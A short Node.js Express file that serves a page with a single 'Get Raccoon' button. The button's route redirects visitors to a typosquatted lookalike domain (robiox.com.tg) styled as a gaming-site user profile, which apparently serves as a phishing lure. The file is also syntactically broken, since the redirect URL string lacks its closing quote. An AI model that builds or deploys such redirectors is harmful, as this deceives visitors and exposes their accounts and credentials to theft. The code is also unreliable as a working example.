const express = require('express');
const app = express();
const port = 3000;

// Route to serve the HTML page
app.get('/', (req, res) => {
  const html = `
    <!DOCTYPE html>
    <html>
    <head>
      <title>Raccoon Getter</title>
      <style>
        body {
          font-family: Arial, sans-serif;
          background: #f0f0f0;
          display: flex;
          height: 100vh;
          align-items: center;
          justify-content: center;
        }
        button {
          padding: 15px 30px;
          font-size: 18px;
          border: none;
          border-radius: 8px;
          background-color: #4caf50;
          color: white;
          cursor: pointer;
        }
        button:hover {
          background-color: #45a049;
        }
      </style>
    </head>
    <body>
      <form action="/get-raccoon" method="GET">
        <button type="submit">Get Raccoon</button>
      </form>
    </body>
    </html>
  `;
  res.send(html);
});

// Route to handle the redirect
app.get('/get-raccoon', (req, res) => {
  // Change this URL to wherever you want to redirect
  res.redirect('https://www.robiox.com.tg/users/187135177344/profile);
});

app.listen(port, () => {
  console.log(`Server running at http://localhost:${port}`);
});
